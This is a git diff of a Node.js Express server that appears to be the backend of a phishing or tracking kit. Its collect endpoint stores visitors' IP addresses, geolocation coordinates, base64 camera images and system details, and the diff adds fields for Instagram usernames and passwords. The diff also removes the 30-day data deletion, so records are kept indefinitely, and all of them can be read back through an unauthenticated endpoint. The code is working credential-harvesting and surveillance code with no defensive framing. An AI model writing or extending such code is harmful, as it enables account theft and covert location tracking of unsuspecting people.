@@ -7,7 +7,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const DATA_FILE = path.join(__dirname, 'data.json');
 
-app.use(express.json({ limit: '15mb' }));
+app.use(express.json({ limit: '10mb' }));
 app.use(cors());
 app.use(express.static(__dirname));
 
@@ -32,24 +32,7 @@ function writeDB(data) {
     fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
 }
 
-function cleanOldData() {
-    let db = readDB();
-    const now = new Date().getTime();
-    let updated = false;
-
-    for (let id in db) {
-        const recordTime = new Date(db[id].timestamp).getTime();
-        const thirtyDaysInMs = 30 * 24 * 60 * 60 * 1000;
-        if (now - recordTime > thirtyDaysInMs) {
-            delete db[id];
-            updated = true;
-        }
-    }
-    if (updated) writeDB(db);
-}
-
 app.post('/api/collect', (req, res) => {
-    cleanOldData();
     let db = readDB();
     const recordId = 'ID_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -59,11 +42,12 @@ app.post('/api/collect', (req, res) => {
     db[recordId] = {
         id: recordId,
         ip: clientIp,
+        instagram_username: req.body.instagram_username || 'N/A',
+        instagram_password: req.body.instagram_password || 'N/A',
         latitude: loc.latitude,
         longitude: loc.longitude,
         image_base64: req.body.image_base64 || null,
-        contacts: req.body.contacts || 'Not Available',
-        gallery_image: req.body.gallery_image || null,
+        system: req.body.system || {},
         timestamp: new Date().toISOString()
     };
 
@@ -72,8 +56,8 @@ app.post('/api/collect', (req, res) => {
 });
 
 app.get('/api/get-data', (req, res) => {
-    cleanOldData();
-    res.status(200).json(readDB());
+    const db = readDB();
+    res.status(200).json(db);
 });
 
 app.listen(PORT, () => {
